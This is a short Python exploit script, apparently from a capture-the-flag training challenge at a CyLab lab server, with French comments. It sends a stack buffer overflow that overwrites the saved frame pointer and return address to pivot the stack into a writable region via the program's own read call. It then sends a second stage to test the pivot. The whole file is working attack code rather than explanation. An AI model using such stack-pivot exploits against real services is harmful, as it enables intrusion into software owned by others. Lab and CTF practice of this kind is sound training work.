import sys, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31809
READ_SEQ = 0x400b6f     # lea rax,[rbp-0x20]; mov edx,0x80; mov rsi,rax; mov edi,0; call read
STAGE = 0x602900


def p64(x):
    return struct.pack("<Q", x)


def attempt(stages, close_after=True):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(4)
    time.sleep(0.3)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(b"A" * 40 + p64(STAGE) + p64(READ_SEQ))
    time.sleep(0.4)
    for st in stages:
        s.sendall(st)
        time.sleep(0.4)
    out = b""
    closed = False
    try:
        while True:
            c = s.recv(4096)
            if not c:
                closed = True
                break
            out += c
    except socket.timeout:
        pass
    except Exception:
        closed = True
    s.close()
    return out, closed


# stage 2 : repivote vers 0x602980 (read a 0x602960)
st2 = b"B" * 0x20 + p64(0x602980) + p64(READ_SEQ)
out, closed = attempt([st2])
print("apres stage2: sortie", len(out), "ferme:", closed)
print("extrait:", repr(out[:250]))
print("=> PIVOT:", "OK (attend encore)" if not closed else "echec")
